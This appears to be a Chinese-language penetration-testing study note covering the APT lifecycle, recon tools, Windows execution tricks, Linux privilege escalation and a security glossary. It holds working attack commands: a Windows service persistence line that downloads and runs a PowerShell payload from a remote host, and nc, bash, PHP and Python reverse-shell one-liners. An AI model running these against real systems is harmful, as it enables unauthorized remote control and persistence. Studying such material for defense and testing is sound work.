# 内网渗透

## APT攻击

**Advanced Persistent Threat**高级可持续威胁攻击/定向威胁攻击

指某组织对特定对象展开的持续有效的攻击活动，集合了多种常见攻击方式的综合攻击，攻击生命周期分为七个阶段

1. **扫描探测**
   * 网络踩点、信息收集
   * 目标网络环境探测、线上服务器分布情况、应用程序弱点分析、了解业务状况、员工信息等
2. **工具投送**
   * 钓鱼邮件、恶意链接、0day
3. **漏洞利用**
   * 利用目标企业使用的软件中的漏洞（有的企业会存在已知漏洞但未修复的情况）
4. **木马植入**
   * 利用漏洞上传木马（键盘记录、木马后门、文件采集）
   * 植入木马后便可以进行长期控制
5. **远程控制**
   * 被植入木马后可以进一步安装远控工具（反向连接），攻击者发送命令给内网机器执行，而不是远程执行命令
   * 反向连接时，由于员工机器是主动与命令和控制服务器通信，因此更难检测
6. **横向渗透**
   * 首先被突破的机器会成为跳板在系统内部进行横向渗透
   * 口令窃听
7. **目标行动**
   * 发现有价值的数据后会加密并压缩再传出去以免受到监控（大多数监控不会针对分析出站流量）



## 信息收集

**目的：了解哪些ip（主机）存活，存活的ip开放了哪些端口，以及端口对应的服务**

* **F-NAScan**

  https://github.com/ywolf/F-NAScan

  

* 

## 弱口令检测

**目的：对常见的端口服务（系统、数据库、web服务）进行弱口令检测**

**套路：弱口令—提权—读取缓存密码**

* **iscan**

  

* 

## Web应用渗透

* **mimikatz**读取缓存密码
* **服务端信任跨越**
  * http://ip/?URL=http://ip
* **WebDav开启允许PUT方法**
* 

### fastjson漏洞

## Web框架/应用/服务器

* **Structs2**
* **WebLogic**
* **Zabbix**
* **Redis未授权访问**

## Windows相关

### windows间接执行exe

* **forfiles**
  
  * forfiles /c c:\windows\system32\calc.exe
  
* **pcalua**
  * **pcalua.exe是windows的系统文件，是windows程序兼容性助理的一个组件**
  * pcalua.exe -a c:\windows\system32\calc.exe

* **路径遍历/参数混乱“**

  * cmd.exe /c "ping 127.0.0.1/../../../../../../../../windows/system32/calc.exe"

  ```shell
  C:\Users\ext.huanglianguan>cmd.exe /c "/windows/system32/calc.exe"
  
  C:\Users\ext.huanglianguan>cmd.exe /c "ping 127.0.0.1/windows/system32/calc.exe"
  Ping 请求找不到主机 127.0.0.1/windows/system32/calc.exe。请检查该名称，然后重试。
  
  C:\Users\ext.huanglianguan>cmd.exe /c "ping 127.0.0.1/../windows/system32/calc.exe"
  Ping 请求找不到主机 127.0.0.1/../windows/system32/calc.exe。请检查该名称，然后重试。
  
  C:\Users\ext.huanglianguan>cmd.exe /c "ping 127.0.0.1/../../windows/system32/calc.exe"
  Ping 请求找不到主机 127.0.0.1/../../windows/system32/calc.exe。请检查该名称，然后重试。
  
  C:\Users\ext.huanglianguan>cmd.exe /c "ping 127.0.0.1/../../../windows/system32/calc.exe"
  ```

  

* **conhost**

  * conhost c:\windows\system32\calc.exe

### windows服务

* **使用sc命令创建windows服务**

  ```shell
  sc [servername] create Servicename [Optionname= Optionvalues]
  # servername
  ## 可选，\\\\myserver或者\\\\192.168.0.1操作远程计算机，本机操作不用添加任何参数
  # 在option= xxx格式中，等号前不用空格，等号后需要空格
  # 简单的木马Cobalt Strike
  sc create "Name" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\"" 
  sc description Name "Just For Test" # 设置服务的描述字符串 
  sc config Name start= auto # 设置这个服务为自动启动 
  net start Name ``# 启动服务 # 重启服务器后，成功返回一个shell
  ```

  

* **修改userinit进行权限维持**

* **mshta.hta执行hta文件**

  * 可使用msf的inbuild exploit

* 

## DLL注入

## Linux提权

### 查看内核版本

```shell
# 查看发行版本
cat /etc/issue
cat /etc/*-release
# 查看内核版本
uname -a
id & uname -a
# kali自带searchsploit搜索exploitdb中的漏洞利用代码
searchsploit linux Debian 4
```

### 反弹shell

#### 正向shell

* **服务端送shell**

  1. 在kali rolling（服务端）上监听23333端口

     ```shell
     nc -lvp 23333 -e /bin/sh
     ```

     

  2. 在ubuntu18（客户端）上连接kali rolling的23333端口

  3. 这时客户端就拿到服务端shell的控制权了

     ```shell
     nc ip 23333
     ```

#### 反弹shell

* **客户端送shell**
  1. 在客户端选择增强版netcat（一般默认是free-bsd版的nc）
  
     ```shell
     update-alternatives --config nc
     ```
  
     
  
  2. kali上启动服务端
  
     ```shell
     nc -lvp 23333
     ```
  
     
  
  3. 客户端上钩
  
     ```shell
     # nc反弹
     nc ip 23333 -e /bin/sh
     # bash反弹
     bash -i >& /dev/tcp/ip/23333 0>&1
     # php反弹
     php -r '$f=fsockopen("ip",23333);exec("/bin/sh -i <&3 >&3 2>&3");'
     # python反弹
     python -c 'import socket,subprocess,os; \
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
     s.connect(("ip",23333));
     os.dup2(s.fileno(),0);
     os.dup2(s.fileno(),1);
     os.dup2(s.fileno(),2);
     p=subprocess.call(["/bin/sh","-i"]);'
     ```
  

#### bash一句话反弹

```shell
bash -i >& /dev/tcp/192.168.1.1/8080 0>&1
```



## 其他

* OpenTSDB 远程代码执行

## 工具等

* **TIG（Threat Intelligence Gathering)  威胁情报收集**

  https://github.com/wgpsec/tig

* **PoC（Proof of Concept）概念验证/漏洞验证程序**

  * 为了证明提出者观点的一段代码，**证明漏洞存在**

* **Exp（Exploit）漏洞利用程序**

  * 利用漏洞做事（比如拿到目标权限）

* **负载均衡**

  * Load Balance

    ![preview](https://pic3.zhimg.com/v2-6aa2607e04cc9d2f0d448f9fa80b2ae2_r.jpg)

  * 将工作负载分布到多个服务器来提高网站、应用、数据库等服务的性能

  * 通过分流算法合理分摊服务器压力，达到服务器性能的最大优化

  * 常见负载均衡算法：

    * **Round Robin（轮询）**——按顺序循环请求列表里的服务器
    * **Least Connections（最小连接）**——优先选择连接数最少的服务器
    * **Source**——根据ip的哈希分配服务器，为了令特定的ip可以使用特定服务器的服务

* **Cyber Kill Chain（网络杀链）**

  * 描述了网络攻击各个阶段的生命周期
  * **侦查**
    * 信息收集、社工、端口扫描等
  * **入侵**
    * 使用收集的信息突破网络并安装恶意软件或反向shell
    * 利用漏洞找资产并记录
  * **利用**
    * 基于系统漏洞将武器化代码放置于服务器上，获取敏感数据（密码、证书、令牌等）
  * **提权**
    * 使用收集的凭证、密码等获取更高的权限，以访问更高安全性的系统和文件区域
  * **横向移动**
    * 通过更高的权限探索新的目标
  * **迷惑**
    * 更改数据以消除泄露证据
    * 植入虚假的数据线索、清楚操作日志、破坏网络取证
  * **拒绝服务**
    * 破坏性攻击
  * **数据泄露**
    * 若攻击成功，则攻击者将获取目标数据并消失

* **DMZ（demilitarized zone）**

  * 为了解决安装防火墙后外网用户不能访问内网服务器的问题而设立的缓冲区
  * 为了将内网和提供访问服务的网络分开，阻止内网和外网直接通信
  * 可以放置web服务器、ftp服务器、论坛、邮件服务器等
  * LAN Area（内网）、DMZ区域、Internet（外网）
    * 外网不能访问内网但可以访问DMZ
    * DMZ访问内网有限制、一般不能访问外网（除了邮件服务器）
  * DMZ与内外网的通信是经过NAT转换的，

* **肉鸡**
  
  * 傀儡机，指可以被黑客远程控制的机器
  
* **C2服务器（Command & Control Server）**

  * 命令与控制服务器

* **CDN（Content Delivery Network）内容分发网络**

* **IDS（Intrusion Detection System）**入侵检测系统

* **HIDS（Host-base Intrusion Detection System）**入侵检测系统

* **IDC（Internet Data Center）**互联网数据中心

* **IPS（Intrusion Prevention System）**入侵防御系统

* **HIPS（Host-base Intrusion Prevention System）主机入侵防御系统**

* **Agent，部署有Agent的机器受server的管理**

* **MSF （The Metasploit Framework) 漏洞框架**
  * Exploit（exp）
  * Payload
  * Shellcode
  * Module
  * Listener
  
* **MSFVenom**

* **Setoolkit**

  * kali中有

* **Magic Unicorn**

  * trustedsec.com
  * [https](https://github.com/trustedsec/unicorn):[//github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

* **Powershell Empire**

* **Koadic**
  
  * https://www.hackingarticles.in/koadic-com-command-control-framework
  
* **GreatSCT**
  
  * https://github.com/GreatSCT/GreatSCT
  
* **Cobalt Strike**
  
  * 模拟红队攻击
  
* **CMS(Content Management System)**

  * 内容管理系统
  * 为了方便发布网络内容而存在的一体化Web管理系统